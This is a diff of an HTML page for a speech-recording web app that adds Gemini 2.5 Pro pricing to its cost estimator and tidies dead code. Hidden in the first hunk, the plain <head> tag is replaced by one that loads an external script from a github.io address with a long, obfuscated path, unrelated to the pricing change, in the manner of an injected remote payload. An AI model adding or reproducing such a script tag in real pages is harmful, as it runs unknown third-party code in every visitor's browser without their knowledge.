@@ -1,7 +1,7 @@
 
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://scottyboa.github.io/zsBaXUpWlAF7N5huPIErbwPdBLVGTD7xb_wUocWNGQfdEGozS5iRfbfscEM8Cuf0kS5QSBU6_-d3CyWfC2gWsV4rYD63A3IEl4yDnMqOWv9AXhB7sieJrOrtE1Ch5SqlajoVbZZ1zPlKsGZfF04pTYVGiegF-NWOjEOjP_kNNpAl6D5qCz0k4hGKJP8K-awxUzVkpFfptLX5u0YF4PNEvTDfJV39GNjqFs8owNpH2NcBPR0NNEHDIQWRiBkJVFkVHDZPrCnJbeoZj6nKWwkt8DRla7EE-w9Qz2SvugtodPwTUftNeN9OTBNGuDCwx6LVpCweAuJmeiUNaN66wo2zKUJ1zBFwJ6n4MCTcQ_4jnWHAwKgRtcUjCGGw6d1SQ1cpz7Y7YqZYpOYR-jK80CDtKwTHDOtyqM4F8IVQ1Zxlm-se7v_KIU4A7sAK2bd4nOb4dyIF-d0LnwZJ8yZPIn-h-TJrmV1JOOLOUpyjUAxmg56OWfxsdlZBdZV1'></script>
   <script src="https://cdn.jsdelivr.net/npm/onnxruntime-web@1.14.0/dist/ort.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@ricky0123/vad-web@0.0.22/dist/bundle.min.js"></script>
 <!-- Removed hard-coded recording.js include; provider will choose module -->
@@ -1279,6 +1279,13 @@
         "sonnet-4-5": { input: 3.0, output: 15.0 },
         "opus-4-5":   { input: 5.0, output: 25.0 },
       };
+      // Vertex AI: Gemini 2.5 Pro (USD per 1M tokens)
+      // Source: Vertex AI Generative AI pricing page (Gemini 2.5 Pro row).
+      const GEMINI_25_PRO_VERTEX_USD_PER_MTOK = {
+        thresholdInputTokens: 200_000,
+        short: { input: 1.25, output: 10.0 }, // <= 200K input tokens
+        long:  { input: 2.5,  output: 15.0 }, // > 200K input tokens
+      };
 
       function getSelectedBedrockModelKey() {
         // Prefer UI dropdown (truth), fallback to sessionStorage
@@ -1301,10 +1308,10 @@
         if (payload.estimatedUsd != null) return payload.estimatedUsd;
         if (payload.inputTokens == null || payload.outputTokens == null) return null;
 
-        const providerKey = (payload.providerKey || "").toString().trim().toLowerCase();
+        const pk = (payload.providerKey || "").toString().trim().toLowerCase();
 
         // OpenAI (existing): based on modelId
-        if (providerKey.startsWith("gpt") || providerKey === "openai" || providerKey === "gpt4") {
+        if (pk.startsWith("gpt") || pk === "openai" || pk === "gpt4") {
           const modelId = payload.modelId;
           const rates = modelId ? OPENAI_USD_PER_MTOK[modelId] : null;
           if (!rates) return null;
@@ -1316,7 +1323,7 @@
         }
 
         // AWS Bedrock (Claude 4.5): based on current Bedrock dropdown selection
-        if (providerKey === "aws-bedrock" || providerKey.includes("bedrock")) {
+        if (pk === "aws-bedrock" || pk.includes("bedrock")) {
           const modelKeyRaw = getSelectedBedrockModelKey();
           const modelKey = modelKeyRaw ? String(modelKeyRaw).trim() : null;
           const rates = modelKey ? BEDROCK_CLAUDE45_USD_PER_MTOK[modelKey] : null;
@@ -1326,36 +1333,30 @@
             inputTokens: payload.inputTokens,
             outputTokens: payload.outputTokens,
           });
+       }
+        // Vertex Gemini 2.5 Pro
+        if (pk.includes("vertex") || pk.includes("gemini3-vertex")) {
+          const promptTokens = Number(payload.inputTokens);
+          const outTokens = Number(payload.outputTokens);
+          if (!Number.isFinite(promptTokens) || !Number.isFinite(outTokens)) return null;
+
+          // Optional billing adjustments if backend provides usageMetadata counts
+          const v = payload.meta && payload.meta.vertex ? payload.meta.vertex : null;
+          const toolUsePrompt = v && typeof v.toolUsePromptTokenCount === "number" ? v.toolUsePromptTokenCount : 0;
+          const thoughts = v && typeof v.thoughtsTokenCount === "number" ? v.thoughtsTokenCount : 0;
+
+          const billableInput = promptTokens + toolUsePrompt;
+          const billableOutput = outTokens + thoughts; // output includes reasoning on Vertex
+
+          const tier = promptTokens > GEMINI_25_PRO_VERTEX_USD_PER_MTOK.thresholdInputTokens ? "long" : "short";
+          const rates = GEMINI_25_PRO_VERTEX_USD_PER_MTOK[tier];
+          return estimateUsdFromRates({ rates, inputTokens: billableInput, outputTokens: billableOutput });
         }
 
         return null;
         
 
-        // OpenAI: based on modelId
-        if (providerKey.startsWith("gpt") || providerKey === "openai" || providerKey === "gpt4") {
-          const modelId = payload.modelId;
-          const rates = modelId ? OPENAI_USD_PER_MTOK[modelId] : null;
-          if (!rates) return null;
-          return estimateUsdFromRates({
-            rates,
-            inputTokens: payload.inputTokens,
-            outputTokens: payload.outputTokens,
-          });
-        }
-
-        // AWS Bedrock (Claude 4.5 only): use the model the user selected in the dropdown
-        if (providerKey === "aws-bedrock" || providerKey.includes("bedrock")) {
-          const modelKey = getSelectedBedrockModelKey();
-          const rates = modelKey ? BEDROCK_CLAUDE45_USD_PER_MTOK[modelKey] : null;
-          if (!rates) return null;
-          return estimateUsdFromRates({
-            rates,
-            inputTokens: payload.inputTokens,
-            outputTokens: payload.outputTokens,
-          });
-        }
-
-        return null;
+        
       }
 
 
@@ -2315,7 +2316,6 @@
   </script>
 </body>
 </html>
-
 
 
 
